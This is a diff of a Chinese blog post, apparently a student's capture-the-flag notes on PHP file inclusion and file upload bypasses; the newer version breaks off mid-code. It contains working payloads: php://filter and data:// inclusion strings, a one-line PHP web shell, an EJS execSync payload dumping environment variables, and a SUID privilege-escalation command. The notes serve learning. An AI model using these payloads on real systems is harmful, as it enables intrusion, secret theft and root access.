@@ -17,20 +17,27 @@
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
   
-  <title>SongHappy</title>
+  <title>基础漏洞 - SongHappy</title>
 
   
-    <meta name="description" content="基础漏洞因为我积累的还很少所以先把这些漏洞放在同一篇blog，等到时候积累的多了再分开 常见的flag存放位置：注释、根目录、环境变量 文件包含  产生原因（1）动态文件包含机制被滥用：PHP提供了如include、require、include_once和require_once等文件包含函数。当这些函数的参数可被用户控制时，攻击者就有机会传入恶意文件路径（2）文件路径过滤不严格：如果服务器端对">
+    <meta name="description" content="因为我积累的还很少所以先把这些漏洞放在同一篇blog，等到时候积累的多了再分开 常见的flag存放位置：注释、根目录、环境变量 文件包含1. 产生原因（1）动态文件包含机制被滥用：PHP提供了如include、require、include_once和require_once等文件包含函数。当这些函数的参数可被用户控制时，攻击者就有机会传入恶意文件路径（2）文件路径过滤不严格：如果服务器端对用户输">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SongHappy">
+<meta property="og:title" content="基础漏洞">
 <meta property="og:url" content="http://example.com/2025/04/12/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="SongHappy">
-<meta property="og:description" content="基础漏洞因为我积累的还很少所以先把这些漏洞放在同一篇blog，等到时候积累的多了再分开 常见的flag存放位置：注释、根目录、环境变量 文件包含  产生原因（1）动态文件包含机制被滥用：PHP提供了如include、require、include_once和require_once等文件包含函数。当这些函数的参数可被用户控制时，攻击者就有机会传入恶意文件路径（2）文件路径过滤不严格：如果服务器端对">
+<meta property="og:description" content="因为我积累的还很少所以先把这些漏洞放在同一篇blog，等到时候积累的多了再分开 常见的flag存放位置：注释、根目录、环境变量 文件包含1. 产生原因（1）动态文件包含机制被滥用：PHP提供了如include、require、include_once和require_once等文件包含函数。当这些函数的参数可被用户控制时，攻击者就有机会传入恶意文件路径（2）文件路径过滤不严格：如果服务器端对用户输">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-04-12T06:19:38.945Z">
-<meta property="article:modified_time" content="2025-04-12T06:18:45.505Z">
+<meta property="og:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412002332959.png">
+<meta property="og:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135831380.png">
+<meta property="og:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135931518.png">
+<meta property="og:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412140301232.png">
+<meta property="og:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141407784.png">
+<meta property="og:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141425416.png">
+<meta property="article:published_time" content="2025-04-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-12T07:09:47.065Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412002332959.png">
   
   
   
@@ -63,7 +70,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2025/03/28/CNN%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B%E5%AE%9E%E7%8E%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%AB/"><span class="title">CNN训练模型实现验证码自动识别</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2025/04/12/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"><span class="title">基础漏洞</span></a><a class="item title" href="/2025/03/28/CNN%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B%E5%AE%9E%E7%8E%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%AB/"><span class="title">CNN训练模型实现验证码自动识别</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -76,51 +83,112 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-04-12T06:19:38.945Z">2025-04-12</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2025-04-12T06:18:45.505Z">2025-04-12</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-04-11T16:00:00.000Z">2025-04-12</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2025-04-12T07:09:47.065Z">2025-04-12</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>基础漏洞</span></h1>
+        
+      </div>
+    </div>
     
   </div>
-  </div><article class="md-text content"><h1 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h1><p>因为我积累的还很少所以先把这些漏洞放在同一篇blog，等到时候积累的多了再分开</p>
-<p>常见的flag存放位置：<br>注释、根目录、环境变量</p>
-<p>文件包含</p>
-<ol>
-<li>产生原因<br>（1）动态文件包含机制被滥用：PHP提供了如include、require、include_once和require_once等文件包含函数。当这些函数的参数可被用户控制时，攻击者就有机会传入恶意文件路径<br>（2）文件路径过滤不严格：如果服务器端对用户输入的文件路径没有进行严格的验证和过滤，比如未检查路径是否合法、是否存在敏感目录穿越字符（如..&#x2F;），攻击者可利用这些字符突破原本的目录限制，访问或包含非预期的文件。例如，<a href="http://example.com/index.php?file=../etc/passwd%EF%BC%8C%E8%8B%A5%E6%9C%AA%E5%AF%B9file%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%A2%AB%E8%AF%BB%E5%8F%96">http://example.com/index.php?file=../etc/passwd，若未对file参数过滤，可能导致系统敏感文件被读取</a></li>
-<li>漏洞类型<br>本地文件包含（LFI，Local File Inclusion）：攻击者利用漏洞包含服务器本地的文件，比如读取系统配置文件（如&#x2F;etc&#x2F;passwd在Linux系统中）来获取敏感信息，或者包含服务器上其他PHP文件，通过分析这些文件进一步挖掘可利用的漏洞。<br>远程文件包含（RFI，Remote File Inclusion）：当PHP配置中allow_url_include选项开启时，攻击者可以通过包含远程服务器上的文件来执行恶意代码。例如，攻击者在远程服务器放置一个恶意PHP文件，内容可能是获取服务器权限、窃取数据等恶意操作，然后通过漏洞让目标服务器包含该远程文件，从而在目标服务器上执行恶意代码。<br>题目：<br>[HCTF 2018]WarmUp<br>主要源码：<br>if (! empty($_REQUEST[‘file’])<br> &amp;&amp; is_string($_REQUEST[‘file’])<br> &amp;&amp; emmm::checkFile($_REQUEST[‘file’])<br> ) {<br> include $_REQUEST[‘file’];</li>
-</ol>
-<p>意思是如果前面的waf都通过，代码将执行 include $_REQUEST[‘file’]; ，将用户指定的文件包含到当前脚本中<br>[Aurora新生赛] Just Signin<br>源码：<br><?php
-highlight_file(__FILE__);
-error_reporting(0);
-//flag is in flag.php
-$u = $_GET['__err0r233.yyds'];
-include $u;
-?></p>
-<p>直接<br>&#x2F;?<em><em>err0r233.yyds&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>试了好久都不行:(<br>为什么呢？<br>是因为后面的“.”被处理为<br>了“</em>”，[，空格，+，.，。都会被处理为_，这是因为当 PHP 版本小于 8 时，如果参<br>数中出现中括号[，中括号会被转换成下划线</em>，但是会出现转换错误导致接下来如果该<br>参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，<br>那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转<br>换成下划线<br>所以 payload 是<br>&#x2F;?_[err0r233.yyds&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>[ACTF2020 新生赛]Include1<br>源码如下：<br>&lt;?php<br>echo “Can you find out the flag?”;<br>&#x2F;&#x2F;flag{af3e9cc8-41d8-4dab-9a9e-dcfbb125379e}</p>
-<p>和上面一题有所不同，直接读取 PHP 文件会导致代码被解析执行，而flag被注释了，所以直接包含看不到，这就需要用到php:&#x2F;&#x2F;filter了<br>php:&#x2F;&#x2F;filter是什么<br>在CTF（Capture The Flag，夺旗赛）中，php:&#x2F;&#x2F;filter 常被用于与PHP代码审计和文件操作相关的题目<br>绕过文件读取限制：在一些CTF题目中，出题者可能限制了对某些敏感文件（如config.php，里面可能包含数据库密码等关键信息）的直接读取，但通过 php:&#x2F;&#x2F;filter 可能绕过这些限制。例如，若系统只允许通过特定函数读取指定目录下的文件，但对 php:&#x2F;&#x2F;filter 的使用未做严格限制，就可以构造类似于 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php 的路径。这样可以将 config.php 的内容进行Base64编码后读取出来，因为Base64编码后的内容通常不会触发系统对敏感文件内容的检测机制。<br>读取被篡改或损坏文件：有时候，题目可能会给出一个已损坏或被篡改过的文件，通过 php:&#x2F;&#x2F;filter 中的一些过滤器，如 string.strip_tags（去除HTML标签）、string.toupper（转换为大写）等，可对文件内容进行清洗或调整，以便获取有用信息。例如，若文件内容被插入了恶意的HTML标签干扰正常阅读，使用 string.strip_tags 过滤器后可能还原出关键信息。<br>于是我们使用php:&#x2F;&#x2F;filter把源码转成base64再读，就可以绕过这个限制<br>#payload<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>进阶：<br>如果php:&#x2F;&#x2F;filter被ban了咋办呢？<br>[攻防世界]Web_php_include<br>源码<br><?php
-show_source(__FILE__);
-echo $_GET['hello'];
-$page=$_GET['page'];
-while (strstr($page, "php://")) {
-    $page=str_replace("php://", "", $page);
-}
-include($page);
-?><br>问一下AI，这里还能用data:&#x2F;&#x2F;text等协议（应该还有其他的，不过还没接触到过，有待我补充）<br>&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls');?><br>最后拿到flag在注释里面，找了好久（ :( 不要忘记看一下注释）<br>总结：<br>常见的伪协议<br>file:&#x2F;&#x2F;<br>php:&#x2F;&#x2F;<br>zip:&#x2F;&#x2F;<br>php:&#x2F;&#x2F;filter 是 PHP 中的一种特殊的伪协议，它允许对数据进行过滤处理php:&#x2F;&#x2F;filter&#x2F;read&#x3D;&lt;过滤器列表&gt;&#x2F;resource&#x3D;&lt;操作目标&gt;过滤器可以是 convert.base64-encode</p>
-<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>按后端类型分类，主要遇到过PHP、Node.js、Python<br>PHP<br>最简单的上传一个<?php @eval($_POST['pass']);?>的php文件，直接用AntSword连接到这个php文件，就能打穿了<br>有waf的<br>CTFHub 文件上传 前端验证<br>直接上传是不允许的<br><a target="_blank" rel="noopener" href="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412002332959.png">https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412002332959.png</a><br>F12看源码<br>function checkfilesuffix()<br>{<br>    var file&#x3D;document.getElementsByName(‘file’)[0][‘value’];<br>    if(file&#x3D;&#x3D;””||file&#x3D;&#x3D;null)<br>    {<br>        alert(“请添加上传文件”);<br>        return false;<br>    }<br>    else<br>    {<br>        var whitelist&#x3D;new Array(“.jpg”,”.png”,”.gif”);<br>        var file_suffix&#x3D;file.substring(file.lastIndexOf(“.”));<br>        if(whitelist.indexOf(file_suffix) &#x3D;&#x3D; -1)<br>        {<br>            alert(“该文件不允许上传”);<br>            return false;<br>        }<br>    }<br>}<br>只要jpg或png或gif<br>法一：在浏览器关闭js，直接上传即可<br>法二：在BurpSuite拦截然后改名就可以</p>
-<p>CTFHub 文件上传 文件头检查<br>文件头：程序在识别文件类型时，通常会首先查看文件魔术头。当一个程序收到一个未知文件时，它会读取文件开头的几个字节（即魔术头），然后将这些字节序列与已知的各种文件类型的魔术头数据库进行比对。如果找到匹配的魔术头，程序就可以初步确定文件的类型。例如，对于JPEG图片，其魔术头一般是“FF D8 FF”，当程序读取到文件开头是这三个字节时，就很可能判断该文件是JPEG图片。<br>所以单纯的改名已经绕不过了，要把一个木马写入到一张图片里面<br>准备一张图片，hack.txt里面有php木马，然后copy 1.png&#x2F;b+1.txt&#x2F;a 2.png<br>上传2.png然后改名2.php即可</p>
-<p>再看一道题目：<br>[极客大挑战 2019]Upload<br>文件后缀名不能是php，检查了文件头，过滤了&lt;?<br>对于php<br>在PHP中，可以使用的文件后缀名不仅仅限于 .php，以下是一些常见的 PHP 文件后缀名：<br>常见的 PHP 文件后缀名<br>.php2, .php3, .php4, .php5, .php7, .php8<br>这些后缀通常用于指定不同版本的 PHP 文件，但在现代开发中很少使用<br>.phtml<br>通常用于包含 PHP 和 HTML 混合代码的文件<br>.phps<br>用于展示 PHP 源代码的文件（通常是高亮显示的源代码）<br>.inc<br>通常用于包含文件（include 或 require），但需要特别注意安全性，因为这些文件可能被直接访问<br>.module, .tpl, .theme<br>在某些框架或 CMS（如 Drupal、WordPress 等）中，可能会使用这些后缀来表示模块、模板或主题文件<br>.cgi<br>有时 PHP 脚本会被配置为 CGI 脚本并使用 .cgi 后缀</p>
-<p>这里尝试php2不行，所以用了phtml<br>一句话木马不能用了，让AI做出修改，代码如下</p>
-<script language="php">eval($_POST['cmd']);</script>
-<p>这样就可以了</p>
-<p>再看一题：<br>SZU靶场 Web 每日一题 2024[day 3] rce and escalation<br>在r.php中已经预先准备好了一个webshell，访问题目url&#x2F;r.php即可，但是flag被设置为仅有root权限可读，需要用SUID提权才能读<br>suid：在linux中的作用是能够让普通用户临时拥有该文件属主的执行权限<br>一般来说suid权限提权即可提权至最高root权限<br>步骤：<br>先找到具有suid权限的文件<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>命令解释：<br>&#x2F; 表示从文件系统的顶部（根）开始，查找每个目录<br>-perm 表示搜索后面的权限<br>-type 表示我们正在寻找的文件类型<br>f 表示普通文件，而不是目录或特殊文件<br>2 表示到进程的第二个文件描述符，即 stderr（标准错误）</p>
-<blockquote>
-<p>表示重定向<br>&#x2F;dev&#x2F;null 是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。<br>合起来的意思就是寻找具有suid标志且属主为root的文件并将所有搜索到的错误信息输出到&#x2F;dev&#x2F;null(不输出错误信息)<br>根据得到的命令去查表<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br>对于本题：<br><a target="_blank" rel="noopener" href="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135831380.png">https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135831380.png</a><br>逐一尝试，发现time可以<br><a target="_blank" rel="noopener" href="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135931518.png">https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412135931518.png</a></p>
-</blockquote>
-<p>&#x2F;usr&#x2F;bin&#x2F;time cat &#x2F;fl*就可以了<br><a target="_blank" rel="noopener" href="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412140301232.png">https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412140301232.png</a></p>
-<p>Node.js </p>
-<p>[Hgame]Level 47 BandBomb<br>给了源码，存在一个路径遍历漏洞，可以通过重命名改变文件路径<br>这个题使用了一个 ejs 视图引擎读取 uploads 目录中的文件列表，如果读取成功，渲染 mortis视图并传递文件列表<br>ejs :EJS 是一种在 Node.js 环境中广泛使用的模板引擎。它允许开发者在普通的 HTML文件中嵌入 JavaScript 代码，从而实现动态生成 HTML 内容。通过 EJS，开发者可以将数据从服务器端传递到前端视图，并根据这些数据来定制 HTML 页面的展示。<br>思路就是上传一个含有恶意代码的 ejs 然后通过上述路径遍历漏洞改变文件的路径让他替换 mortis.ejs<br>上传<br>&lt;%&#x3D; require(‘child_process’).execSync(“env &gt; &#x2F;app&#x2F;public&#x2F;1.txt”) %&gt;<br>意思就是创建一个子进程获取环境变量把它写入到&#x2F;public 下的 1.txt<br>这时候只需要改个名从而改变它的路径替换 mortis.ejs源码中有一句话 app.use(express.json());所以改名需要 POST json<br><a target="_blank" rel="noopener" href="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141407784.png">https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141407784.png</a><br>根据前面的恶意代码，我们只需要访问&#x2F;static&#x2F;1.txt 即可获取环境变量，里面有一个FLAG<br><a target="_blank" rel="noopener" href="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141425416.png">https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412141425416.png</a></p>
-<p>Python<br>遇到过一道题，但是尚未解决，SZU靶场python-include</p>
-<p>SQL注入（SQL是一点不会先不写了）</p>
+  </div><article class="md-text content"><p><strong>因为我积累的还很少所以先把这些漏洞放在同一篇blog，等到时候积累的多了再分开</strong></p>
+<p>常见的flag存放位置：<br><strong>注释、根目录、环境变量</strong></p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><details class="tag-plugin colorful folding" ><summary><span>1. 产生原因</span></summary><div class="body"><p>（1）动态文件包含机制被滥用：PHP提供了如include、require、include_once和require_once等文件包含函数。当这些函数的参数可被用户控制时，攻击者就有机会传入恶意文件路径</p><p>（2）文件路径过滤不严格：如果服务器端对用户输入的文件路径没有进行严格的验证和过滤，比如未检查路径是否合法、是否存在敏感目录穿越字符（如..&#x2F;），攻击者可利用这些字符突破原本的目录限制，访问或包含非预期的文件。例如，<a href="http://example.com/index.php?file=../etc/passwd">http://example.com/index.php?file=../etc/passwd</a> 若未对file参数过滤，可能导致系统敏感文件被读取</p></div></details>
+<details class="tag-plugin colorful folding" ><summary><span>2. 漏洞类型</span></summary><div class="body"><p>（1）本地文件包含（LFI，Local File Inclusion）：攻击者利用漏洞包含服务器本地的文件，比如读取系统配置文件（如&#x2F;etc&#x2F;passwd在Linux系统中）来获取敏感信息，或者包含服务器上其他PHP文件，通过分析这些文件进一步挖掘可利用的漏洞</p><p>（2）远程文件包含（RFI，Remote File Inclusion）：当PHP配置中allow_url_include选项开启时，攻击者可以通过包含远程服务器上的文件来执行恶意代码。例如，攻击者在远程服务器放置一个恶意PHP文件，然后通过漏洞让目标服务器包含该远程文件，从而在目标服务器上执行恶意代码</p></div></details>
 
+
+<p><strong>题目：</strong></p>
+<h6 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h6><p>主要源码：</p>
+<details class="tag-plugin colorful folding" child="codeblock" open><summary><span>source</span></summary><div class="body"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br></pre></td></tr></table></figure></div></details>
+
+<p>意思是如果前面的waf都通过，代码将执行 <mark class="tag-plugin colorful mark" color="yellow">include $_REQUEST[file];</mark>，将用户指定的文件包含到当前脚本中</p>
+<h6 id="Aurora新生赛-Just-Signin"><a href="#Aurora新生赛-Just-Signin" class="headerlink" title="[Aurora新生赛] Just Signin"></a>[Aurora新生赛] Just Signin</h6><p>源码：</p>
+<details class="tag-plugin colorful folding" child="codeblock" open><summary><span>source</span></summary><div class="body"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//flag is in flag.php</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;__err0r233.yyds&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$u</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></details>
+<p>直接</p>
+<mark class="tag-plugin colorful mark" color="yellow">/?__err0r233.yyds=php://filter/read=convert.base64-encode/resource=flag.php</mark>
+<p>试了好久都不行:(</p>
+<p>为什么呢？<br>是因为后面的“.”被处理为了“_”，<strong>[|空格|+|.|。都会被处理为_</strong></p>
+<details class="tag-plugin colorful folding" ><summary><span>原理</span></summary><div class="body"><p>这是因为当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线</p></div></details>
+<p>所以 payload 是</p>
+<mark class="tag-plugin colorful mark" color="yellow">/?_[err0r233.yyds=php://filter/read=convert.base64-encode/resource=flag.php</mark>
+<h6 id="ACTF2020-新生赛-Include1"><a href="#ACTF2020-新生赛-Include1" class="headerlink" title="[ACTF2020 新生赛]Include1"></a>[ACTF2020 新生赛]Include1</h6><p>源码如下：</p>
+<details class="tag-plugin colorful folding" child="codeblock" open><summary><span>source</span></summary><div class="body"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;af3e9cc8-41d8-4dab-9a9e-dcfbb125379e&#125;</span></span><br></pre></td></tr></table></figure></div></details>
+
+<p>和上面一题有所不同，直接读取 PHP 文件会导致代码被解析执行，而flag被注释了，所以直接包含看不到，这就需要用到<strong>php:&#x2F;&#x2F;filter</strong>了</p>
+<details class="tag-plugin colorful folding" ><summary><span>php://filter是什么</span></summary><div class="body"><p>在CTF（Capture The Flag，夺旗赛）中，php:&#x2F;&#x2F;filter 常被用于与PHP代码审计和文件操作相关的题目<br>绕过文件读取限制：在一些CTF题目中，出题者可能限制了对某些敏感文件（如config.php，里面可能包含数据库密码等关键信息）的直接读取，但通过 php:&#x2F;&#x2F;filter 可能绕过这些限制。例如，若系统只允许通过特定函数读取指定目录下的文件，但对 php:&#x2F;&#x2F;filter 的使用未做严格限制，就可以构造类似于 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php 的路径。这样可以将 config.php 的内容进行Base64编码后读取出来，因为Base64编码后的内容通常不会触发系统对敏感文件内容的检测机制。<br>读取被篡改或损坏文件：有时候，题目可能会给出一个已损坏或被篡改过的文件，通过 php:&#x2F;&#x2F;filter 中的一些过滤器，如 string.strip_tags（去除HTML标签）、string.toupper（转换为大写）等，可对文件内容进行清洗或调整，以便获取有用信息。例如，若文件内容被插入了恶意的HTML标签干扰正常阅读，使用 string.strip_tags 过滤器后可能还原出关键信息。</p></div></details>
+
+<p>于是我们使用php:&#x2F;&#x2F;filter把源码转成base64再读，就可以绕过这个限制<br>payload</p>
+<mark class="tag-plugin colorful mark" color="yellow">/?file=php://filter/read=convert.base64-encode/resource=flag.php</mark>
+
+<p>进阶：<br>如果php:&#x2F;&#x2F;filter被ban了咋办呢？</p>
+<h6 id="攻防世界-Web-php-include"><a href="#攻防世界-Web-php-include" class="headerlink" title="[攻防世界]Web_php_include"></a>[攻防世界]Web_php_include</h6><p>源码:</p>
+<details class="tag-plugin colorful folding" child="codeblock" open><summary><span>source</span></summary><div class="body"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></details>
+
+<p>问一下AI，这里还能用<mark class="tag-plugin colorful mark" color="yellow">data://text</mark>等协议（应该还有其他的，不过还没接触到过，有待我补充）</p>
+<mark class="tag-plugin colorful mark" color="yellow">/?page=data://text/plain,<?php system(ls);?></mark>
+
+<p>最后拿到flag在注释里面，找了好久（ :( 不要忘记看一下注释）</p>
+<p><strong>总结：</strong></p>
+<details class="tag-plugin colorful folding"  open><summary><span>常见的伪协议</span></summary><div class="body"><p>file:&#x2F;&#x2F;<br>php:&#x2F;&#x2F;<br>zip:&#x2F;&#x2F;<br>php:&#x2F;&#x2F;filter 是 PHP 中的一种特殊的伪协议，它允许对数据进行过滤处理php:&#x2F;&#x2F;filter&#x2F;read&#x3D;&lt;过滤器列表&gt;&#x2F;resource&#x3D;&lt;操作目标&gt;过滤器可以是 convert.base64-encode</p></div></details>
+
+
+
+
+<h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><p>按后端类型分类，主要遇到过<strong>PHP、Node.js、Python</strong></p>
+<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p>最简单的上传一个<mark class="tag-plugin colorful mark" color="yellow"><?php @eval($_POST[pass]);?></mark>的php文件，直接用AntSword连接到这个php文件，就能打穿了</p>
+<p>下面是有<mark class="tag-plugin colorful mark" color="yellow">waf</mark>的</p>
+<h6 id="CTFHub-文件上传-前端验证"><a href="#CTFHub-文件上传-前端验证" class="headerlink" title="CTFHub 文件上传 前端验证"></a>CTFHub 文件上传 前端验证</h6><p>直接上传是不允许的</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://songhappypicture.oss-cn-shenzhen.aliyuncs.com/img/20250412002332959.png" data-fancybox="true" style="width:90%;"/></div></div>
+<p>F12看源码</p>
+<details class="tag-plugin colorful folding" child="codeblock" open><summary><span>source</span></summary><div class="body"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkfilesuffix</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请添加上传文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    